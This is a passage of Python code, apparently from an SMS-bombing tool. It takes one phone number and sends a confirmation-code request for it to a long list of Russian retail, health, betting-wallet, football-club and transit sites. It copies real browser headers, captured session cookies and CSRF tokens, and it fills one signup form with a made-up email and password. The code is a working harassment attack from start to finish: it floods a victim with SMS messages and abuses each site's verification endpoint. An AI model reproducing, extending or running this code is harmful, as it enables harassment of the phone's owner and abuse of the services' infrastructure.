                                'cookie': 'BasketUID=d15861d0-fde7-40ef-9486-15f5f7381a65; _wbauid=7539586261657398304; route=1657398306.022.11810.653561|e1694d492c822662a2bcfd079c8a6249; __wbl=cityId%3D0%26regionId%3D0%26city%3D%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3%26phone%3D84957755505%26latitude%3D59%2C939037%26longitude%3D30%2C315784%26src%3D1; __store=125238_125239_125240_117673_122258_122259_117734_159402_2737_117544_132043_161812_121709_124731_117501_507_204939_3158_120762_117986_130744_1733_686_1193; __region=68_64_83_4_38_80_33_70_82_86_30_69_22_66_31_40_1_48; __pricemargin=1.0--; __cpns=12_7_3_6_5_18_21; __sppfix=; __dst=-1216601_-337422_-1114902_-1198055; ncache=125238_125239_125240_117673_122258_122259_117734_159402_2737_117544_132043_161812_121709_124731_117501_507_204939_3158_120762_117986_130744_1733_686_1193%3B68_64_83_4_38_80_33_70_82_86_30_69_22_66_31_40_1_48%3B1.0--%3B12_7_3_6_5_18_21%3B%3B-1216601_-337422_-1114902_-1198055; __tm=1657409105; ___wbu=72ab583c-1a27-4864-8474-5b41218cd7f9.1657398305; ___wbs=6c070b97-34ee-4c58-8068-17c9d27c2172.1657398305; __wba_s=1; _wbSes=CfDJ8BtF0T5sZrlIuLVvoGBKRZYJnDGnbDnUGeofJNe9r7tYx%2FUiHEOqBf7z3K90FJYL9jW631hJqx3P9GiLYtr6fFaSKBp%2FqqslfMxrrJH7tD%2B0lEXdPlq3vKDcLVwzqATQAedgX5kxKDOPRQbDGbZNJpCL7Su0ltRcVNasOUDBGj1K',
                                'origin': 'https://www.wildberries.ru',
                                'referer': 'https://www.wildberries.ru/security/login?returnUrl=https%3A%2F%2Fwww.wildberries.ru%2F',
                                'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user,
                                'x-kl-ajax-request': 'Ajax_Request',
                                'x-requested-with': 'XMLHttpRequest',
                                'x-spa-version': '9.3.4',
                            }
                            payload = {
                                'phoneInput.AgreeToReceiveSmsSpam': False,
                                'phoneInput.ConfirmCode': '',
                                'phoneInput.FullPhoneMobile': number,
                                'returnUrl': 'https%3A%2F%2Fwww.wildberries.ru%2F',
                                'phonemobile': number,
                                'agreeToReceiveSms': False,
                                'shortSession': True,
                                'period': 'ru'
                            }
                            requests.post(
                                'https://www.wildberries.ru/webapi/mobile/requestconfirmcode?forAction=EasyLogin',
                                data=payload, headers=header)
                        except:
                            pass
                        try:
                            num = number
                            num2 = ""
                            num2 += '+'
                            num2 += '7'
                            num2 += ' '
                            num2 += '('
                            num2 += num[1]
                            num2 += num[2]
                            num2 += num[3]
                            num2 += ')'
                            num2 += ' '
                            num2 += num[4]
                            num2 += num[5]
                            num2 += num[6]
                            num2 += '-'
                            num2 += num[7]
                            num2 += num[8]
                            num2 += '-'
                            num2 += num[9]
                            num2 += num[10]
                            header = {
                                'accept': '*/*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'content-length': '89',
                                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                'cookie': 'PHPSESSID=fcGBRpJ9fFgRpjqEW1uOzRbY69HAzlZU; DG_HOME_SALE_UID=272493274; DG_HOME_GEO_DATA_NEW=%7B%22IP%22%3A%22178.170.198.53%22%2C%22CITY%22%3A%22%5Cu0421%5Cu0430%5Cu043d%5Cu043a%5Cu0442-%5Cu041f%5Cu0435%5Cu0442%5Cu0435%5Cu0440%5Cu0431%5Cu0443%5Cu0440%5Cu0433%22%2C%22REGION%22%3A%22%5Cu0421%5Cu0430%5Cu043d%5Cu043a%5Cu0442-%5Cu041f%5Cu0435%5Cu0442%5Cu0435%5Cu0440%5Cu0431%5Cu0443%5Cu0440%5Cu0433%22%2C%22COUNTRY%22%3A%22%5Cu0420%5Cu043e%5Cu0441%5Cu0441%5Cu0438%5Cu044f%22%2C%22CODE%22%3A%220000103664%22%2C%22COORDS%22%3A%7B%22x%22%3A59.93863%2C%22y%22%3A30.31413%7D%7D; i-like-data=%5B%5D; i-like-id=763293360214388693; i-like-key=783324292312045817; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1657313940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1657243987980650064; _ym_d=1657243987; __cfruid=bae882ca93555f37ca576a50036267298c43f129-1657243985; DG_HOME_dgpid=eyJ2YWx1ZSI6IjkwMTMzNzkxIiwicHVibGljS2V5IjoiZG1PbVI0SXZtdHVxQ0E2TyIsInNpZ24iOiJlNzQ5YmFhYzJjZTZmMjc2OWE5ZDViOGViMTY5MTE2NyJ9; _ym_isad=1; rees46_session_code=qifpGgk9gR; rees46_session_last_act=1657243986638; rees46_device_id=0pLtShobpo; rees46_lazy_recommenders=true; __cf_bm=XTgjYExcUbLGc4_6JVRao59eBAqX01Q7kTcRUIOTLeo-1657243985-0-AXrCnD8U8vjXkcPudtQIZWwLAaP4lerWmU44djH/49OsQleScJDoLsVipoPQyTB3YF84lqp3WBTqkLmxZPwFZh2KGn4ZqHc5f4rKF9py9xoZqIdxz82KMx3dkXXF25WFRw==',
                                'dnt': '1',
                                'origin': 'https://dg-home.ru',
                                'referer': 'https://dg-home.ru/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user,
                                'x-bitrix-csrf-token': '31f28c262375f7778780adcd4c1d18ca',
                                'x-requested-with': 'XMLHttpRequest'
                            }
                            payload = {
                                'sessid': '31f28c262375f7778780adcd4c1d18ca',
                                'TYPE': 'auth',
                                'PHONE': num2,
                                'auth_agree': '1'
                            }
                            r = requests.post('https://dg-home.ru/login/', data=payload, headers=header)
                            a0 = str(r.text)
                            part1, part2 = a0.split('bxs: ')
                            a1 = part2
                            part3, part4 = a1.split('xs: ')
                            res1 = ''
                            res2 = ''
                            cnt = 0
                            for i in range(len(part2)):
                                if part2[i] == "'":
                                    cnt += 1
                                if cnt < 2:
                                    res1 += part2[i]
                                if cnt >= 2:
                                    break
                            res1 = res1[1:]
                            cnt = 0
                            for i in range(len(part4)):
                                if part4[i] == "'":
                                    cnt += 1
                                if cnt < 2:
                                    res2 += part4[i]
                                if cnt >= 2:
                                    break
                            res2 = res2[1:]
                            header = {
                                'accept': '*/*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'content-length': '100',
                                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                'cookie': 'PHPSESSID=fcGBRpJ9fFgRpjqEW1uOzRbY69HAzlZU; DG_HOME_SALE_UID=272493274; DG_HOME_GEO_DATA_NEW=%7B%22IP%22%3A%22178.170.198.53%22%2C%22CITY%22%3A%22%5Cu0421%5Cu0430%5Cu043d%5Cu043a%5Cu0442-%5Cu041f%5Cu0435%5Cu0442%5Cu0435%5Cu0440%5Cu0431%5Cu0443%5Cu0440%5Cu0433%22%2C%22REGION%22%3A%22%5Cu0421%5Cu0430%5Cu043d%5Cu043a%5Cu0442-%5Cu041f%5Cu0435%5Cu0442%5Cu0435%5Cu0440%5Cu0431%5Cu0443%5Cu0440%5Cu0433%22%2C%22COUNTRY%22%3A%22%5Cu0420%5Cu043e%5Cu0441%5Cu0441%5Cu0438%5Cu044f%22%2C%22CODE%22%3A%220000103664%22%2C%22COORDS%22%3A%7B%22x%22%3A59.93863%2C%22y%22%3A30.31413%7D%7D; i-like-data=%5B%5D; i-like-id=763293360214388693; i-like-key=783324292312045817; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1657313940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1657243987980650064; _ym_d=1657243987; __cfruid=bae882ca93555f37ca576a50036267298c43f129-1657243985; DG_HOME_dgpid=eyJ2YWx1ZSI6IjkwMTMzNzkxIiwicHVibGljS2V5IjoiZG1PbVI0SXZtdHVxQ0E2TyIsInNpZ24iOiJlNzQ5YmFhYzJjZTZmMjc2OWE5ZDViOGViMTY5MTE2NyJ9; _ym_isad=1; rees46_session_code=qifpGgk9gR; rees46_session_last_act=1657243986638; rees46_device_id=0pLtShobpo; rees46_lazy_recommenders=true; __cf_bm=XTgjYExcUbLGc4_6JVRao59eBAqX01Q7kTcRUIOTLeo-1657243985-0-AXrCnD8U8vjXkcPudtQIZWwLAaP4lerWmU44djH/49OsQleScJDoLsVipoPQyTB3YF84lqp3WBTqkLmxZPwFZh2KGn4ZqHc5f4rKF9py9xoZqIdxz82KMx3dkXXF25WFRw==',
                                'dnt': '1',
                                'origin': 'https://dg-home.ru',
                                'referer': 'https://dg-home.ru/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user,
                                'x-bitrix-csrf-token': '31f28c262375f7778780adcd4c1d18ca',
                                'x-requested-with': 'XMLHttpRequest'
                            }
                            payload = {
                                'action': 'confirm_auth',
                                'site': 's1',
                                'bxs': res1,
                                'xs': res2
                            }
                            requests.post(
                                'https://dg-home.ru/local/components/dghome-new/sms.confirm/templates/.default/ajax.php',
                                data=payload, headers=header)
                        except:
                            pass
                        try:
                            num = number
                            num2 = ""
                            num2 += '7'
                            num2 += ' '
                            num2 += '('
                            num2 += num[1]
                            num2 += num[2]
                            num2 += num[3]
                            num2 += ')'
                            num2 += ' '
                            num2 += num[4]
                            num2 += num[5]
                            num2 += num[6]
                            num2 += ' '
                            num2 += num[7]
                            num2 += num[8]
                            num2 += ' '
                            num2 += num[9]
                            num2 += num[10]
                            header = {
                                'accept': '*/*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'content-length': '63',
                                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                'cookie': 'PHPSESSID=l5aBRN7PGJgASxApu4Xlw5gDPQW9rpXq; BITRIX_OR_cookieLocationNew=a%3A5%3A%7Bs%3A8%3A%22LOCATION%22%3Bs%3A10%3A%220000103664%22%3Bs%3A4%3A%22CITY%22%3Bs%3A29%3A%22%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3%22%3Bs%3A11%3A%22REGION_NAME%22%3Bs%3A41%3A%22%D0%9B%D0%B5%D0%BD%D0%B8%D0%BD%D0%B3%D1%80%D0%B0%D0%B4%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%22%3Bs%3A10%3A%22PRICE_TYPE%22%3Ba%3A2%3A%7Bs%3A4%3A%22CODE%22%3Bs%3A52%3A%22%D0%A4%D0%B8%D1%80%D0%BC%D0%B5%D0%BD%D0%BD%D0%B0%D1%8F%20%D1%80%D0%BE%D0%B7%D0%BD%D0%B8%D1%86%D0%B0%20%D0%B0%D0%BA%D1%86%D0%B8%D0%BE%D0%BD%D0%BD%D0%B0%D1%8F%22%3Bs%3A2%3A%22ID%22%3Bi%3A10%3B%7Ds%3A12%3A%22FEDERAL_NAME%22%3BN%3B%7D; PAID_SOURCE_LABEL=na; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A20%2C%22EXPIRE%22%3A1657227540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1657153918121826480; _ym_d=1657153918; _ym_visorc=w; _ym_isad=1; G_ENABLED_IDPS=google',
                                'dnt': '1',
                                'origin': 'https://orby.ru',
                                'referer': 'https://orby.ru/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user,
                                'x-requested-with': 'XMLHttpRequest'
                            }
                            payload = {
                                'phone': num2,
                                'sessid': '408d7573119828883c19f6d2e908684b'
                            }
                            requests.post('https://orby.ru/local/ajax/auth/phone.php', data=payload, headers=header)
                        except:
                            pass
                        try:
                            num = number
                            num2 = ""
                            num2 += '7'
                            num2 += ' '
                            num2 += num[1]
                            num2 += num[2]
                            num2 += num[3]
                            num2 += '-'
                            num2 += num[4]
                            num2 += num[5]
                            num2 += num[6]
                            num2 += '-'
                            num2 += num[7]
                            num2 += num[8]
                            num2 += '-'
                            num2 += num[9]
                            num2 += num[10]
                            header = {
                                'accept': 'application/json',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'content-length': '2160',
                                'content-type': 'application/json',
                                'cookie': 'city=msk; site_version=desktop; first_hit_url=/; uid=45BBBAB97429C6623430FDB70235D554; sid=ubq7RWLGKXS3/TA0VNU1Ag==; geo_city_confirmed=yes; _ym_uid=1657153910485756991; _ym_d=1657153910; _ym_isad=1; prfr_tkn=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiZnVsbCIsInZlcnNpb24iOjEsImlkIjoiYzBkYzViOTItMjNmZi00ZjdlLWFjYjItYzIxMjczNzIxMTY1Iiwic3RhdHVzIjoidG91Y2hlZCIsInNlc3Npb25JZCI6ImJhN2FhZmNhLTlmMTMtNDRlYS1iODBjLTUxZGYyMzM5YjJmZCIsImlhdCI6MTY1NzE1NTI0NiwiZXhwIjoxNjU3MTU1ODQ2LCJqdGkiOiJjMGRjNWI5Mi0yM2ZmLTRmN2UtYWNiMi1jMjEyNzM3MjExNjUifQ.Zg6nZq5eLbWaE66p0mAdVdCZkCInjxz7XsYAbThyXlo; wtfId=3951490-1657155247.064-178.170.198.53-2769; ets=%2F_next%2Fdata%2Fprod-5c89200b5d%2Fmsk%2Fcabinet%2Flogin.json%2Chttps%3A%2F%2Fprofi.ru%2F%2C1657155247',
                                'dnt': '1',
                                'origin': 'https://profi.ru',
                                'referer': 'https://profi.ru/cabinet/login/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user,
                                'x-app-id': 'PROFI',
                                'x-new-auth-compatible': '1',
                                'x-requested-with': 'XMLHttpRequest',
                                'x-wtf-id': '3944500-1657153908.650-178.170.198.53-2018'
                            }
                            payload = {
                                "query": "#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c510e2159ee8fcfb2c5b9\nquery authStrategyStart($type: AuthStrategyType!, $initialState: AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, initialState: $initialState) {\n    ...AuthStrategyUseResultFragment\n  }\n}\n    fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\n  strategy {\n    strategyDescriptor\n    stepDescriptor\n    name\n    type\n  }\n  result {\n    __typename\n    ... on AuthStrategyResultRetry {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultError {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultSuccess {\n      __typename\n      answer {\n        __typename\n        events {\n          __typename\n          ... on AuthStrategyIAnalyticEvent {\n            type\n          }\n        }\n      }\n      auth {\n        loginUrl\n      }\n      step {\n        __typename\n        stepId\n        title\n        ... on AuthStrategyStepFillPhone {\n          phoneSuggestion\n        }\n        ... on AuthStrategyStepValidateMobileId {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepValidatePincode {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepFillUserInfo {\n          requestedFields {\n            __typename\n            fieldId\n            type\n            required\n            suggestedValue\n          }\n        }\n        ... on AuthStrategyStepRequestSocNet {\n          socNetId\n          oAuthStateToken\n          popupUrl\n          windowWidth\n          windowHeight\n        }\n        ... on AuthStrategyStepRequestYandex {\n          appId\n          scopes\n        }\n      }\n    }\n  }\n}",
                                "variables": {"type": "phone",
                                              "initialState": {"phoneNumber": num2, "defaultOrderCityId": "prfr",
                                                               "currentHost": "https://profi.ru"}}}
                            requests.post('https://profi.ru/graphql', json=payload, headers=header)
                        except:
                            pass
                        try:
                            header = {
                                'Host': 'pass.fc-zenit.ru',
                                'Connection': 'keep-alive',
                                'Content-Length': '65',
                                'Cache-Control': 'max-age=0',
                                'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'Upgrade-Insecure-Requests': '1',
                                'Origin': 'https://pass.fc-zenit.ru',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'User-Agent': user,
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                'Sec-Fetch-Site': 'same-origin',
                                'Sec-Fetch-Mode': 'navigate',
                                'Sec-Fetch-User': '?1',
                                'Sec-Fetch-Dest': 'document',
                                'Referer': 'https://pass.fc-zenit.ru/auth/register',
                                'Accept-Encoding': 'gzip, deflate, br',
                                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'Cookie': 'RMID=62c62feb037367.43238894; _ym_d=1657155564; XSRF-TOKEN=eyJpdiI6IkZadEhETUtDMERsZ29NZmdFcCsxRnc9PSIsInZhbHVlIjoiNW9PcWZSRk5QUnRwdmt5M25Tdkt4Vml1a0loVnNFWHM0RXM5aFB3U0FXazlWaGFnUWZmVHNlY0FYdC9mTndXVVR5REg1YlNmMnp5UW1ydUhhU05TcXc4TW5NNXN4WHlpUHJjQVl4ZjRIUGZURDVyZy9wdjhhZHJLdis4UlU1VVciLCJtYWMiOiI1Y2UyOTA0ZDIyZTc3OTQzM2UyMWFmMjYyNzg5YTAwZGE2NzUzZDgwYzZhMzJkYzEzY2FiNjU1OTNiOWVhZjJmIiwidGFnIjoiIn0%3D; passfc_zenitru_session=eyJpdiI6IndRM0w2R2FHQzByZnNHM1pyOU5KaFE9PSIsInZhbHVlIjoibkRvUlFOQ1NTcUVhTy9mK0JXTWQrdERYZmtranRTQ0g2Q3lOQWd2SzZJdE92MXFnSkVzRDYyMkpqV0dhclhFblZlTy9IeEU2OWhoZkx6enk2Qzd0Mktoc2M3VXQ1MTFmdUpoM1VkaGFMNG5wVnNtZTlRUWJDUkhKQk8xQyt0OW0iLCJtYWMiOiJmMmU0MTUzZWE4ZDAzMzMzNjJiM2ZmZjA3Y2Q0MGM1MjhjNDBkOTVhZDNlZDI2MTk1NTI0OTVjYjRkZDQ5ZTU1IiwidGFnIjoiIn0%3D'
                            }
                            payload = f'_token=vOCCvAramaboUHNyT5mqZwHb51BhQX0AmDXDyOCE&phone={number}'
                            requests.post('https://pass.fc-zenit.ru/auth/register/phone', data=payload, headers=header)
                        except:
                            pass
                        try:
                            header = {
                                'accept': '*/*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'content-length': '164',
                                'content-type': 'application/json; charset=UTF-8',
                                'cookie': 'route=1657153864.612.1118.226509|4d33fc6b928f7f8ef63e5c30cfa97296; WELCOMESESSID=mapee0c248ue8c4tfuoj1rfj8f; _user_location=3eaf80b99b78f648b2ef3159af22d67d1551ea0424141f70965891ede650e8e3a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_user_location%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D; utm=dfa68bfddf725256f8f84bc7fa628dd7656cc2fce1a6d522d4e73426f4b1ec02a%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22utm%22%3Bi%3A1%3Bs%3A104%3A%22%7B%22utm_source%22%3A%22Organic%22%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3A%22yandex.ru%22%2C%22utm_term%22%3Anull%2C%22utm_content%22%3Anull%7D%22%3B%7D; JivoSiteLoaded=1',
                                'dnt': '1',
                                'origin': 'https://abc.ru',
                                'referer': 'https://abc.ru/registration/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user
                            }
                            payload = {"phone": "+" + number, "country_id": '1', "scenario": "registration",
                                       "_csrf": "MtRE_k1-uTzyO2JEmGI7BBW1G4Iz3ru4Gm2Da3SrIxxloSWtHCryDYJLDnThKWFnTYF9s3i6_tdiGPAgPNhTRg=="}
                            requests.post('https://abc.ru/clientapi/v1/user/phone-sms/', json=payload, headers=header)
                        except:
                            pass
                        try:
                            header = {
                                'accept': '*/*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'content-length': '73',
                                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                'cookie': 'I_BITRIX2_SM_SALE_UID=c508b622908b326d9c1a5915d00cf30e; _ga=GA1.2.342945668.1657153859; _gid=GA1.2.760601932.1657153859; _ym_uid=1657153859366054950; _ym_d=1657153859; _ym_isad=1; PHPSESSID=7VyERBH7eNBFVpqLE3jo1fqLIiP6gS3M; I_BITRIX2_SM_BSPopUpBnr=%7B%2296255%22%3A1657243058%7D; I_BITRIX2_SM_BSCatalogSection=24; _ym_visorc=w; _gat=1',
                                'dnt': '1',
                                'origin': 'https://m.citystarwear.com',
                                'referer': 'https://m.citystarwear.com/lk/profile/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user,
                                'x-requested-with': 'XMLHttpRequest'
                            }
                            payload = {
                                'hdlr': 'bsAuthSendCode',
                                'key': 'DOvBhIasDOvBhISEoVINS',
                                'phone': number[1:],
                                'pcode': '+' + number[:1]
                            }
                            requests.post(
                                'https://m.citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php',
                                data=payload, headers=header)
                        except:
                            pass
                        try:
                            header = {
                                'accept': 'application/json, text/plain, */*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'captcha': 'dD0xNjU3MTYwNDQ5O2k9MTc4LjE3MC4xOTguNTM7RD0xRThBQTdEMDJEQUQwMkI5ODMzN0Y0RThFMTk4MzRCMDI3NkFBMzMyMjUwOTM3RTZGMzY5OTlFNjQ3MzFCNkM2NEQ5MUVBRjI7dT0xNjU3MTYwNDQ5OTg5NjM1MDA3O2g9NzgxMTJkNDRhZWY0MmJlNTYxNzA2M2IwZmZhY2JhMjk=',
                                'content-length': '23',
                                'content-type': 'application/json;charset=UTF-8',
                                'cookie': 'ddmp-shop=rahvgbj8i0t9pqqul1hubojebs; _csrf-ddmp-shop=tEXIbMghHCJ3zSbg7egtXwTzxRud1xCo; qrator_msid=1657160061.085.gjhgPGJijpNDZqFb-ote6oh4fbst0tv4nimikq06a3d4oo42h',
                                'dnt': '1',
                                'origin': 'https://lk.sberhealth.ru',
                                'referer': 'https://lk.sberhealth.ru/login-v2?redirectUrl=/telemed',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user
                            }
                            payload = {
                                'phone': number
                            }
                            requests.post('https://lk.sberhealth.ru/api/gateway/web/rest/v1/auth/sms/initiate',
                                          json=payload,
                                          headers=header)
                        except:
                            pass
                        try:
                            num = number
                            num2 = ""
                            num2 += "+"
                            num2 += '7'
                            num2 += ' '
                            num2 += '('
                            num2 += num[1]
                            num2 += num[2]
                            num2 += num[3]
                            num2 += ')'
                            num2 += ' '
                            num2 += num[4]
                            num2 += num[5]
                            num2 += num[6]
                            num2 += ' '
                            num2 += num[7]
                            num2 += num[8]
                            num2 += ' '
                            num2 += num[9]
                            num2 += num[10]
                            header = {
                                'accept': 'application/json',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'content-length': '102',
                                'content-type': 'application/json',
                                'cookie': 'PHPSESSID=XUm3mOpwgcVf7ygU2fEFbXS2csWHKJ5M; qrator_ssid=1657160038.320.81fBg40VOkUX61L3-nfs2v7id4msq7tg286m0fejao6a3gapf; _ym_uid=165716004180966042; _ym_d=1657160041; _ym_isad=1; qrator_jsr=1657160605.476.5mmDyCBwlDavmV5d-rtkeeperf9il4h8keoanr7qf0ja9s679-00; qrator_jsid=1657160605.476.5mmDyCBwlDavmV5d-sjvtt0g7m0dcgd5gmbi382f8ug6ud0lq; CUPIS-SESSION-ID=2a98fbbf-c12f-42c2-9b25-d7e9be7bfef9',
                                'dnt': '1',
                                'origin': 'https://wallet.1cupis.ru',
                                'referer': 'https://wallet.1cupis.ru/signup?utm_referrer=https%3A%2F%2F1cupis.ru%2F',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user,
                                'x-csrf-token': 'db6a7fbe-8e9f-4e5a-9c3a-86f98952249d'
                            }
                            payload = {
                                'confirm': 'on',
                                'email': 'ijp2423gj@hotmail.com',
                                'password': 'rfdDDle123',
                                'phone': num2
                            }
                            requests.post('https://wallet.1cupis.ru/doSendSms', json=payload, headers=header)
                        except:
                            pass
                        try:
                            header = {
                                'accept': '*/*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'content-length': '0',
                                'cookie': 'old_design=0; is_show_welcome_mechanics=1; _tuid=c6448b0a001e3090da7e86e5ae7b4bd2f27e523c; _space=spb_cl%3A; ab_test=90x10v4%3A1%7Creindexer%3A2%7Cnew_designv10%3A2%7Cnew_designv13%3A1%7Cproduct_card_design%3A3%7Cdynamic_yield%3A2%7Cwelcome_mechanics%3A4%7Cdummy%3A20; ab_test_analytics=90x10v4%3A1%7Creindexer%3A2%7Cnew_designv10%3A2%7Cnew_designv13%3A1%7Cproduct_card_design%3A3%7Cdynamic_yield%3A2%7Cwelcome_mechanics%3A4%7Cdummy%3A20; _dy_ses_load_seq=84052%3A1657161316441; _dy_csc_ses=t; _dy_c_exps=; _dy_soct=1017570.1030352.1657161316*1033770.1068198.1657161316*1036008.1075335.1657161316*1046273.1214460.1657161316*1008131.1012968.1657161316*1015299.1026208.1657161316',
                                'dnt': '1',
                                'origin': 'https://www.citilink.ru',
                                'referer': 'https://www.citilink.ru/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user,
                                'x-requested-with': 'XMLHttpRequest'
                            }
                            requests.post(f'https://www.citilink.ru/registration/confirm/phone/+{number}/',
                                          headers=header)
                        except:
                            pass
                        try:
                            header = {
                                'accept': 'application/json, text/plain, */*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en',
                                'content-length': '89',
                                'content-type': 'application/json',
                                'dnt': '1',
                                'origin': 'https://lk.mosmetro.ru',
                                'referer': 'https://lk.mosmetro.ru/sign-up/phone-info',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user
                            }
                            payload = {
                                "sessionId": "81395913-4b99-4f62-b137-bef62640ba10",
                                "login": number,
                                "type": "phone"
                            }
                            requests.post('https://lk.mosmetro.ru/api/registrations/v1.0/verify', json=payload,
                                          headers=header)
                        except:
